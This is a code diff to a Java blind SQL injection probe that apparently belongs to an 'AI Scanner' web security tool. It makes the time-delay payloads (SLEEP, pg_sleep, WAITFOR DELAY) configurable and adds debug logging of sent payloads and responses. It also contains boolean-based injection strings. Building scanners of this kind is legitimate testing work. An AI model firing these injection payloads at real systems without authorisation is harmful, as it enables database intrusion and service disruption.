@@ -56,16 +56,31 @@ public final class BlindSqliProbe {
             {" AND 1=1", " AND 1=2", " AND 8=8"},
             {"') OR ('1'='1", "') OR ('1'='2", "') OR ('8'='8"},
     };
-    // Time-delay payloads (~5s) across engines; appended to the value.
-    private static final String[] TIME = {
-            "' AND SLEEP(5)-- -",
-            " AND SLEEP(5)-- -",
-            "' AND SLEEP(5) AND '1'='1",
-            "';SELECT pg_sleep(5)-- -",
-            "' AND pg_sleep(5)-- -",
-            "';WAITFOR DELAY '0:0:5'-- -",
-    };
-    private static final long TIME_THRESHOLD_MS = 4000;
+    // Time-delay payloads across engines; appended to the value.
+    // Sleep duration is configurable: -Daiscanner.sqliSleepSec=N (or AISCANNER_SQLI_SLEEP_SEC). Default 5s.
+    // Increase for high-latency targets where 5s is noise; decrease for fast inner loops.
+    private static final int SLEEP_SEC;
+    private static final String[] TIME;
+    private static final long TIME_THRESHOLD_MS;
+    static {
+        int s = 5;
+        try {
+            String v = System.getProperty("aiscanner.sqliSleepSec");
+            if (v == null || v.isBlank()) v = System.getenv("AISCANNER_SQLI_SLEEP_SEC");
+            if (v != null && !v.isBlank()) s = Math.max(1, Math.min(60, Integer.parseInt(v.trim())));
+        } catch (Throwable ignore) { }
+        SLEEP_SEC = s;
+        String mm = String.format("0:0:%d", s);
+        TIME = new String[]{
+            "' AND SLEEP(" + s + ")-- -",
+            " AND SLEEP(" + s + ")-- -",
+            "' AND SLEEP(" + s + ") AND '1'='1",
+            "';SELECT pg_sleep(" + s + ")-- -",
+            "' AND pg_sleep(" + s + ")-- -",
+            "';WAITFOR DELAY '" + mm + "'-- -",
+        };
+        TIME_THRESHOLD_MS = (long)(s * 1000 * 0.8);   // 80% of sleep = confirmed delay
+    }
     private static final Pattern SKIP = Pattern.compile(
             "(?i).*/(socket\\.io|engine\\.io)(\\b.*)?$|.*\\.(css|js|png|jpe?g|gif|svg|ico|woff2?|ttf|eot|map|mp4|webp|pdf)(\\?.*)?$");
     // A JSON "key":"value" string field (value may contain escaped chars).
@@ -276,14 +291,23 @@ public final class BlindSqliProbe {
             }
         }
         // --- time-based ---
+        String tUrl = req.url().split("\\?")[0];
         for (String payload : TIME) {
+            HttpRequest tReq = build.apply(orig + payload);
+            String tBody = tReq.body() != null && tReq.body().length() > 0
+                    ? tReq.bodyToString().replace("\n"," ").replace("\r","") : "(no body)";
+            if (tBody.length() > 200) tBody = tBody.substring(0, 200) + "…";
             long s0 = System.nanoTime();
-            send(build.apply(orig + payload));
+            HttpRequestResponse tRr = send(tReq);
             long dt = (System.nanoTime() - s0) / 1_000_000;
+            String tStatus = (tRr != null && tRr.response() != null) ? "HTTP " + tRr.response().statusCode() : "timeout";
+            scanLog.debug("[AI Scanner] blind-sqli time-test @ " + tUrl + "  " + label
+                    + " +" + dt + "ms (" + tStatus + ") payload=«" + (orig + payload).replace("\n"," ") + "» body=" + tBody);
             if (dt > baseMs + TIME_THRESHOLD_MS) {
                 long c0 = System.nanoTime();                   // confirm it's the payload, not a fluke
                 HttpRequestResponse tr = send(build.apply(orig + payload));   // capture the delayed response as evidence
                 long dt2 = (System.nanoTime() - c0) / 1_000_000;
+                scanLog.debug("[AI Scanner] blind-sqli time-test CONFIRM @ " + tUrl + "  " + label + " +" + dt2 + "ms");
                 if (dt2 > baseMs + TIME_THRESHOLD_MS) {
                     recordSqli("SQL injection (blind)", pathOnly(req.url()), "time-based " + label + " +" + dt
                             + "ms (the injected sleep delayed the response — attached)" + prov(req.url()), tr);
@@ -503,7 +527,7 @@ public final class BlindSqliProbe {
     public int sendCount() { return sends.get(); }
     public int timeoutCount() { return timeouts.get(); }
 
-    private static final long SLOW_SEND_MS = 8_000L;   // a send this slow = the target is stalling us (however it fails)
+    private static final long SLOW_SEND_MS = SLEEP_SEC * 1000L + 3_000L;   // sleep + 3s margin = stalling threshold
 
     private HttpRequestResponse send(HttpRequest req) {
         if (targetHanging) return null;   // circuit open: this target stalls responses → stop hammering it
@@ -525,8 +549,16 @@ public final class BlindSqliProbe {
         boolean bad = (rr == null || rr.response() == null || ms >= SLOW_SEND_MS);
         if (bad) {
             int n = timeouts.incrementAndGet();
+            String bodySnip = req.body() != null && req.body().length() > 0
+                    ? req.bodyToString().replace("\n", " ").replace("\r", "")
+                    : "(no body)";
+            if (bodySnip.length() > 300) bodySnip = bodySnip.substring(0, 300) + "…";
+            String respSnip = (rr != null && rr.response() != null)
+                    ? " → HTTP " + rr.response().statusCode() + " " + rr.response().bodyToString()
+                            .replace("\n"," ").replace("\r","").substring(0, Math.min(200, rr.response().bodyToString().length()))
+                    : " → (no response / timeout)";
             scanLog.debug("[AI Scanner] blind-sqli: slow/failed send (" + n + "/" + HANG_TRIP + ", " + ms + "ms) @ "
-                    + req.url().split("\\?")[0]);
+                    + req.url().split("\\?")[0] + "  " + req.method() + " body: " + bodySnip + respSnip);
             if (n >= HANG_TRIP && !targetHanging) {
                 targetHanging = true;
                 scanLog.log("[AI Scanner] blind-SQLi: target is stalling responses (" + n + " slow/failed of "
